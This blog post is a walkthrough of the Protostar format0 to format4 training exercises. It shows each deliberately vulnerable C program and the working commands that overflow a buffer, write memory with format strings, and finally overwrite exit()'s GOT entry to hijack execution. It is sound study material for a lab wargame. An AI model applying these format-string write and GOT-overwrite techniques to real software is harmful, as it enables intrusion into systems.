+++
author = "pwntester"
categories = ["protostar", "format1", "format2", "format3", "format4"]
date = 2013-12-19T17:29:00Z
description = ""
draft = false
slug = "protostar-format0-4-write-ups"
tags = ["protostar", "format1", "format2", "format3", "format4"]
title = "Protostar format0-4 write-ups"

+++

## Format0
In [Format0](http://www.exploit-exercises.com/protostar/format0) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
    printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

This is not really a format string vulnerability, our argument is going to be written in **buffer** with no size checks and **buffer** is just above **target** so we can overwrite it:

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/format0 `python -c 'print("A"*64 + "\xef\xbe\xad\xde")'`
you have hit the target correctly :)
```

If we want to do it in a more FormatString fashion:

```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/format0 %64d`python -c 'print("\xef\xbe\xad\xde")'`
you have hit the target correctly :)
```

## Format1
In [Format1](http://www.exploit-exercises.com/protostar/format1) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);

  if(target) {
    printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

We need to find the **target** address:

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/format1
Reading symbols from /opt/protostar/bin/format1...done.
(gdb) b main
Breakpoint 1 at 0x8048425: file format1/format1.c, line 19.
(gdb) r aaaa
Starting program: /opt/protostar/bin/format1 aaaa

Breakpoint 1, main (argc=2, argv=0xbffff844) at format1/format1.c:19
19	format1/format1.c: No such file or directory.
	in format1/format1.c
(gdb) p &target
$2 = (int *) 0x8049638
```

We also need to find how far is going to be our string argument. We will be using the format string to read the memory till we find our string:

```lang-bash line-numbers 
user@protostar:~$ for i in {1..200};do echo "trying offset $i - `/opt/protostar/bin/format1 DDDD%$i\\$08x`"; done | grep DDDD44444444
trying offset 133 - DDDD44444444
```

Ok, so now, we will be writing an "unknown" value (number of characters written so far) into the address pointed by the 133 argument which turns out to be our string and the first 4 bytes are pointing the the address of **target** in the BSS section. So will be overwritting **target**

```lang-bash line-numbers 
/opt/protostar/bin/format1 `python -c 'print("\x38\x96\x04\x08")'`%133\$08n
8you have modified the target :)
```

## Format2
In [Format2](http://www.exploit-exercises.com/protostar/format2) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);

  if(target == 64) {
    printf("you have modified the target :)\n");
  } else {
    printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Ok, lets find the **target** address in BSS:

```lang-bash line-numbers 
user@protostar:~$ objdump -t /opt/protostar/bin/format2 | grep target
080496e4 g     O .bss	00000004              target
```

Now, lets find how far is **buffer**:

```lang-bash line-numbers 
user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x > temp; echo "trying offset $i - `/opt/protostar/bin/format2 < temp`"; done | grep DDDD44444444
trying offset 4 - DDDD44444444
```

Lets verify it writing "4" (the minimum value we can write since its the number of bytes of the address we want to write in):

```lang-bash line-numbers 
user@protostar:~$ perl -e 'print "\xe4\x96\x04\x08"."%4\$08n"' | /opt/protostar/bin/format2
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "es_ES.UTF-8",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
target is 4 :(
```

Ok, it works, so lets go for the 64:

```lang-bash line-numbers 
user@protostar:~$ perl -e 'print "\xe4\x96\x04\x08"."%60d"."%4\$08n"' | /opt/protostar/bin/format2
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "es_ES.UTF-8",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
                                                         512you have modified the target :)
```

## Format3
In [Format3](http://www.exploit-exercises.com/protostar/format3) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);

  if(target == 0x01025544) {
    printf("you have modified the target :)\n");
  } else {
    printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Ok, same thing but now target is checked against a dword, and in order to write such a large number we will be writing two consecutive **shorts**. First thing, find the **target** address:

```lang-bash line-numbers 
user@protostar:~$ objdump -t /opt/protostar/bin/format3 | grep target
080496f4 g     O .bss	00000004              target
```

Next, find the offsite of the **buffer**:

```lang-bash line-numbers 
user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x > temp; echo "trying offset $i - `/opt/protostar/bin/format3 < temp`"; done | grep DDDD44444444
trying offset 12 - DDDD44444444
```

So the trick here is to split 0x01025544 into 0x0102 and 0x5544 and write them in two consecutive 2bytes memory addresses.

0x0102 = 258
0x5544 = 21828

So we need to write 258 into 0x080496f6 (target + 2 address) and 21828 into 080496f4 (target address) since we are using a little indian system. Also, we only want to write two bytes, so we will use **%hn** for that.

Also, the arguments to printf will be addresses so 4 bytes each. If our buffer starts in the offset 12, then the next printf argument (13) will be 4 bytes from the beggining of our buffer, and thats where we need to place the address of the 2 LSB bytes:


```lang-bash line-numbers 
user@protostar:~$ perl -e 'print "\xf6\x96\x04\x08"."\xf4\x96\x04\x08"."%250d"."%12\$hn"."%21570d"."%13\$hn"' | /opt/protostar/bin/format3
..
..
..
-1073744480you have modified the target :)
```


## Format4
In [Format4](http://www.exploit-exercises.com/protostar/format4) we are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);
}

int main(int argc, char **argv)
{
  vuln();
}
```

In this level, we need to redirect execution flow to the "unused" hello() function. The easiest way to do it is using the format string vulnerability in **printf(buffer)** to overwrite an entry in the **GOT** table where system function addresses are cached. The only function called after printf is **exit()** so if we overwrite exit address in the GOT table with the hello() address, we will successfully redirect the execution flow to **hello()**. We need to know:
- hello() address
- exit() address in GOT table
- Format Strig offset

**hello()** address:

```lang-bash line-numbers 
user@protostar:~$ objdump -t /opt/protostar/bin/format4 | grep hello
080484b4 g     F .text	0000001e              hello
```

**exit()** address in GOT table:

```lang-bash line-numbers 
user@protostar:~$ objdump -TR /opt/protostar/bin/format4 | grep exit
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
```

Format Strig offset:

```lang-bash line-numbers 
user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x > temp; echo "trying offset $i - `/opt/protostar/bin/format4 < temp`"; done | grep DDDD44444444
trying offset 4 - DDDD44444444
```

We want to write **hello()** address which is too long for a format string attack so we will be using the technique presented in format3.
hello() address is 0x080484b4
We can split it so:
0x0804 = 2052 will be written in the 2 last bytes of the target address -> 0x08049726
0x84b4 = 33972 will be written in the 2 first bytes of the target address -> 0x08049724

Since 33972 > 2052 we need to write 2052 first:

```lang-bash line-numbers 
"\x26\x97\x04\x08"."\x24\x97\x04\x08"."%(2052-8)d"."%4\$hn"."%(33972-2052)d"."%5\$hn"
```

Doing the maths:

```lang-bash line-numbers 
"\x26\x97\x04\x08"."\x24\x97\x04\x08"."%2044d"."%4\$hn"."%31920d"."%5\$hn"
```

And the attack:

```lang-bash line-numbers 
user@protostar:~$ perl -e 'print "\x26\x97\x04\x08"."\x24\x97\x04\x08"."%2044d"."%4\$hn"."%31920d"."%5\$hn"' | /opt/protostar/bin/format4
&$
..
..
    512
..
..
-1208122336code execution redirected! you win
```
